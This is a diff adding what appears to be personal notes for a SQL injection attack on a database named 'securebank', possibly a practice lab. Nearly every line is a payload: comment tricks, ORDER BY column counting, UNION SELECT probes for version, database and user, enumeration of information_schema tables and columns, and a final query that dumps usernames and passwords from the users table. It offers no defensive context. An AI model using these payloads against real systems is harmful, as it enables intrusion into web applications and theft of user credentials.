@@ -1,0 +1,22 @@
+comment = -- , # , /* */
+ AND 1=1
+ 6' order by 7
+-6' UNION SELECT 1,2,3,4,5,6 --+
+VERSION()
+DATABASE()
+USER()
+@@datadir
+mysql -u root -p ''
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'securebank';
+-6' UNION SELECT GROUP_CONCAT(table_name),1,1,1,1,1 FROM information_schema.tables WHERE table_schema = 'securebank'--+
+
+now we have 
+know database, tables, and database infomations.
+
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'securebank' AND TABLE_NAME = 'users';
+
+id=-6' UNION SELECT GROUP_CONCAT(table_name),1,1,1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'securebank' AND TABLE_NAME = 'users'; --+
+
+id=-6' UNION SELECT GROUP_CONCAT(COLUMN_NAME),1,1,1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'securebank' AND TABLE_NAME = 'users'; --+
+
+-6' UNION SELECT GROUP_CONCAT(username),1,GROUP_CONCAT(password),1,1,1 FROM users--+
